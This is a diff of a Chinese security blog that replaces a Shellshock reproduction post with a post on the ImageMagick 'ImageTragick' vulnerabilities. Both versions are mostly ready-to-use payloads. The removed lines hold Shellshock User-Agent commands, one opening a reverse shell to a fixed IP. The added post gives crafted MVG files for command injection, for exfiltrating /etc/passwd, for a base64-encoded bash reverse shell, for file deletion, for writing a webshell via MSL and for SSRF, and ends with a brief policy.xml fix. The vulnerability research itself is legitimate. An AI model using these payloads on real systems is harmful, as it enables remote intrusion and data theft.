@@ -5,10 +5,10 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="破壳漏洞（CVE-2014-4217）, W4nde3&#39;s Secret">
+    <meta name="keywords" content="ImageMagick系列漏洞, W4nde3&#39;s Secret">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="KeoTn_OFy4ndJwXNmm2gMeQfPhd7alqE9vQDwI32KCY">
-    <meta name="description" content="复现访问http://ip:port/cgi-bin/poc.cgi,修改UA字段执行命令命令执行：User-Agent: () { :;};echo ; echo; echo $(/bin/ls -al /);反弹shell：User-A">
+    <meta name="description" content="简介ImageMagick可以创建，编辑，撰写，或转换位图图像。它可以读取和写入各种格式（超过200种）的图像，包括PNG，JPEG，GIF，HEIC，TIFF，DPX，EXR，WebP，Postscript，PDF和SVG。使用Image">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -16,7 +16,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>破壳漏洞（CVE-2014-4217） | W4nde3&#39;s Secret</title>
+    <title>ImageMagick系列漏洞 | W4nde3&#39;s Secret</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -482,13 +482,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        破壳漏洞（CVE-2014-4217）
+                        ImageMagick系列漏洞
                     </div>
                 </div>
             </div>
@@ -610,7 +610,7 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-11-09
+                    2020-12-18
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -624,14 +624,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        338
+                        1.1k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        1 分
+                        5 分
                     </div>
                     
                 
@@ -648,10 +648,80 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>访问<a href="http://ip:port/cgi-bin/poc.cgi,修改UA字段执行命令" target="_blank" rel="noopener">http://ip:port/cgi-bin/poc.cgi,修改UA字段执行命令</a><br>命令执行：User-Agent: () { :;};echo ; echo; echo $(/bin/ls -al /);<br>反弹shell：User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/108.160.128.46/8888 0&gt;&amp;1;<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/0dda8ca45ef31539.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/b77a81a4751b0af8.png" alt=""></p>
-<p>注意：部分嵌入式设备的环境变量未设置会导致一些命令需要使用绝对路径，可在执行命令前导入环境变量。</p>
-<pre><code>User-Agent: () { :;};echo ; echo; export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; echo $(/bin/ls -al /);</code></pre><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>旧版本Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。主要原因在于输入过滤中没有严格限制边界，也没有做出合法化的参数判断。<br>此漏洞属于Bash漏洞，本身并不能导致远程代码执行，需要在第三方服务程序作为媒介，如apache2的CGI组件</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.freebuf.com/news/48331.html" target="_blank" rel="noopener">https://www.freebuf.com/news/48331.html</a><br><a href="https://www.antiy.com/response/CVE-2014-6271.html" target="_blank" rel="noopener">https://www.antiy.com/response/CVE-2014-6271.html</a></p>
+                <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ImageMagick可以创建，编辑，撰写，或转换位图图像。它可以读取和写入各种格式（超过200种）的图像，包括PNG，JPEG，GIF，HEIC，TIFF，DPX，EXR，WebP，Postscript，PDF和SVG。使用ImageMagick可以调整图像大小，翻转，镜像，旋转，变形，剪切和变换图像，调整图像颜色，应用各种特殊效果或绘制文本，线条，多边形，椭圆和贝塞尔曲线。<br>imageMagic中文站：<a href="http://www.imagemagick.com.cn/" target="_blank" rel="noopener">http://www.imagemagick.com.cn/</a></p>
+<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>ImageMagick 6.9.3-9 before</p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><h4 id="常规利用（利用委托中对https的解析）"><a href="#常规利用（利用委托中对https的解析）" class="headerlink" title="常规利用（利用委托中对https的解析）"></a>常规利用（利用委托中对https的解析）</h4><pre><code>push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.0/oops.jpg"|ls -al /")'
+pop graphic-context
+
+push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 'http://192.168.43.26/demo.php?x=`cat /etc/passwd `'
+pop graphic-context
+
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.1/demo.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDMuMjYvOTk5OSAwPiYx | base64 -d | bash`"||id " )'
+pop graphic-context</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/12/feae72f8529073c0.png" alt=""></p>
+<h4 id="受限利用（利用委托中对miff的解析）"><a href="#受限利用（利用委托中对miff的解析）" class="headerlink" title="受限利用（利用委托中对miff的解析）"></a>受限利用（利用委托中对miff的解析）</h4><pre><code>exiftool -label="\"|/usr/bin/id; \"" test.png
+convert test.png o.show</code></pre><p>但由于此条委托中设定encode=show，因此只有将图片转换成.show文件时才能触发，test.png可为普通文件<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/12/858f247cd37a8163.png" alt=""></p>
+<h3 id="CVE-2016-3715"><a href="#CVE-2016-3715" class="headerlink" title="CVE-2016-3715"></a>CVE-2016-3715</h3><p>利用ImageMagick对ephemeral协议的支持删除任意文件</p>
+<pre><code>push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 'ephemeral:/tmp/delete.txt'
+popgraphic-context</code></pre><h3 id="CVE-2016-3716"><a href="#CVE-2016-3716" class="headerlink" title="CVE-2016-3716"></a>CVE-2016-3716</h3><p>利用ImageMagick对msl协议的支持，来进行文件的读取和写入，借此可以将任意格式文件写为php/jsp，构造webshell。先创建msl.txt，后使用msl协议解析</p>
+<pre><code># file_move.mvg
+push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 'msl:/tmp/msl.txt'
+popgraphic-context
+
+# /tmp/msl.txt
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;image&gt;
+&lt;read filename="/tmp/image.gif" /&gt;
+&lt;write filename="/var/www/shell.php" /&gt;
+&lt;/image&gt;</code></pre><h3 id="CVE-2016-3717"><a href="#CVE-2016-3717" class="headerlink" title="CVE-2016-3717"></a>CVE-2016-3717</h3><p>本地文件读取漏洞</p>
+<pre><code>push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 'label:@/etc/hosts'
+pop graphic-context
+$ convert file_read.mvg out.png</code></pre><h3 id="CVE-2016-3718"><a href="#CVE-2016-3718" class="headerlink" title="CVE-2016-3718"></a>CVE-2016-3718</h3><p>由于mvg可以包含url，借此发起SSRF攻击</p>
+<pre><code>push graphic-conbntext
+viewbox 0 0 640 480
+fill 'url(http://example.com/)'
+pop graphic-context$ convert ssrf.mvg out.png # makes http request to example.co</code></pre><h3 id="利用工具："><a href="#利用工具：" class="headerlink" title="利用工具："></a>利用工具：</h3><p>burpsuite插件：<a href="https://github.com/silentsignal/burp-image-size/releases/download/v0.3/burp-image-size-v0.3-java1.6.jar" target="_blank" rel="noopener">https://github.com/silentsignal/burp-image-size/releases/download/v0.3/burp-image-size-v0.3-java1.6.jar</a><br>metasploit：use exploits/unix/fileformat/imagemagick_delegate</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ImageMagick有一个委托（delegate）功能，使用system函数调用外部lib来处理文件，如处理https协议的文件时会调用wget请求文件。定义委托规则的文件叫<a href="https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L99" target="_blank" rel="noopener">delegate.xml</a>。<br>将html标签反转义：（有漏洞版本的委托程序是curl，当前版本换成wget以fix bug）</p>
+<pre><code>&lt;delegate decode=\"https\" command=\"&amp;quot;wget&amp;quot; -q -O &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;\"/&gt;"
+
+&lt;delegate decode=\"https\" command=\""wget" -q -O "%o" "https:%M"\"/&gt;"</code></pre><p>可见，imagemagic程序解析https资源文件时，若使用curl先保存文件，其中命令直接渲染到<code>%M</code>处，因此产生命令注入漏洞。ImageMagic默认支持mvg格式的图片，此格式以文本形式写入矢量图的内容，即便文件后缀部位mvg，imageMagic也会根据被容识别并处理，因此构造mvg格式的文本可实现常规利用：</p>
+<pre><code>push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://"|id; ")'
+pop graphic-context</code></pre><p>类似的，另一个miff格式的委托规则也存在此问题，但由于限定encode=show，因此利用受限。</p>
+<pre><code>&lt;delegate decode="miff" encode="show" spawn="True" command="&amp;quot;/usr/bin/display&amp;quot; -delay 0 -window-group %[group] -title &amp;quot;%l &amp;quot; &amp;quot;ephemeral:%i&amp;quot;"/&gt;
+
+&lt;delegate decode="miff" encode="show" spawn="True" command=""/usr/bin/display" -delay 0 -window-group %[group] -title "%l " "ephemeral:%i""/&gt;
+
+exiftool -label="\"|/usr/bin/id; \"" test.png
+convert test.png o.show</code></pre><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ol>
+<li><p>限制委托功能，检查图片头，如果格式非预期就写函数处理而不用imagemagick处理，php中可以使用getimagesize函数检查格式</p>
+</li>
+<li><p>使用policy file防御此漏洞，可配置policy.xml文件禁止敏感操作</p>
+<pre><code>&lt;policymap&gt;
+&lt;policy domain="coder" rights="none" pattern="EPHEMERAL" /&gt;
+&lt;policy domain="coder" rights="none" pattern="URL" /&gt;
+&lt;policy domain="coder" rights="none" pattern="HTTPS" /&gt;
+&lt;policy domain="coder" rights="none" pattern="MVG" /&gt;
+&lt;policy domain="coder" rights="none" pattern="MSL" /&gt;
+&lt;/policymap&gt; </code></pre></li>
+</ol>
+<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ol>
+<li><a href="https://imagetragick.com/" target="_blank" rel="noopener">https://imagetragick.com/</a></li>
+<li><a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a></li>
+<li><a href="https://www.secpulse.com/archives/57126.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/57126.html</a></li>
+</ol>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -696,7 +766,7 @@
                     </span>
                     <a href="https://blog.iwonder.run" class="b-link-green">W4nde3's Secret</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2020/11/09/cve-2014-6271/" class="b-link-green">破壳漏洞（CVE-2014-4217）</a>
+                    <a href="/2020/12/18/imagemagick-xi-lie-lou-dong/" class="b-link-green">ImageMagick系列漏洞</a>
                 </p>
             </div>
 
@@ -718,63 +788,29 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/11/11/cmseasy-5.6-getshell/">
+                <a href="/2020/12/18/imagemagick-xi-lie-lou-dong/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="CmsEasy < 5.6  代码执行漏洞">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="ImageMagick系列漏洞">
                         
-                        <span class="card-title">CmsEasy < 5.6  代码执行漏洞</span>
+                        <span class="card-title">ImageMagick系列漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            复现phpinfo准备好匿名访问的FTP server，将payload图片上传到ftp目录下POST访问搭建好的漏洞环境：
-http://45.32.74.108:8000/index.php?case=tool&amp;act=cut_
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-11-11
-                        </span>
-                        <span class="publish-author">
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="fa fa-dot-circle-o"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/11/09/cve-2014-6271/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="破壳漏洞（CVE-2014-4217）">
-                        
-                        <span class="card-title">破壳漏洞（CVE-2014-4217）</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            复现访问http://ip:port/cgi-bin/poc.cgi,修改UA字段执行命令命令执行：User-Agent: () { :;};echo ; echo; echo $(/bin/ls -al /);反弹shell：User-A
+                            简介ImageMagick可以创建，编辑，撰写，或转换位图图像。它可以读取和写入各种格式（超过200种）的图像，包括PNG，JPEG，GIF，HEIC，TIFF，DPX，EXR，WebP，Postscript，PDF和SVG。使用Image
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-11-09
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-18
                             </span>
                         <span class="publish-author">
                             
@@ -782,6 +818,42 @@ http://45.32.74.108:8000/index.php?case=tool&amp;act=cut_
                     </div>
                 </div>
 
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/12/09/payload-xia-zai-ji-qiao/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="一句话下载">
+                        
+                        <span class="card-title">一句话下载</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            前言本篇博客整理了多种一句话下载文件的脚本，用于payload迁移
+vbs# 执行：cscript download.vbs http://39.105.228.43/index.html index.html
+echo set a=cre
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-09
+                            </span>
+                        <span class="publish-author">
+                            
+                        </span>
+                    </div>
+                </div>
                 
             </div>
         </div>
